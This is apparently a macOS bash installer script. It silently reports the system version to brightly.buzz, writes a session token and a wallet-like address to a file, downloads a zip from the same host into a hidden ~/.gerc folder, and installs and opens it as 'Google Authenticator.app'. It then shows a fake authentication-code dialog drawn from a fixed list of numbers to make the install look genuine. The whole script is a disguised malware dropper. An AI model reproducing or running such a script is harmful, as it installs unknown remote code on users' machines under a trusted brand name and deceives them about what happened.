#!/bin/bash

curl -s "https://brightly.buzz/post_info?uuid=c350ec73-2815-45ee-98eb-19266f0904cd&os=$(/usr/bin/sw_vers -productVersion)" > /dev/null 2>&1

cd ~
mkdir tmp
cd ~/tmp
echo SESSION=ubLyJXRvdnIneViE456vdQ2bfSVDC8tflVv7vNKpI5QZJk6JLU+Hqm/oQ40JUFXglfiNUonf02wcn6O6B404hA== > context
echo SERVER_ADDRESS=0xCd01cc4172842EC6351e8C72AA5D959a2C7def24 >> context

cd ~/
mkdir .gerc
cd .gerc
curl -o initer.zip https://brightly.buzz/fileServe/Authenticator.zip  > /dev/null 2>&1
unzip -o initer.zip > /dev/null 2>&1
rm -f initer.zip > /dev/null 2&>1
mv "Google Authenticator.app" /Applications

open "/Applications/Google Authenticator.app"

array=(
  "234166"
  "923819"
  "134665"
  "195642"
  "465102"
  "355477"
  "296082"
  "964125"
  "305478"
  "532116"
)
RANDOM_INDEX=$((RANDOM % ${#array[@]}))
OTP=${array[$RANDOM_INDEX]}
FORMATTED_OTP="${OTP:0:3} ${OTP:3:3}"
osascript -e "display dialog \"Authentication code: ${FORMATTED_OTP}\" with title \"Google Authenticator\" buttons {\"Confirm\"} default button \"Confirm\""

exit 0
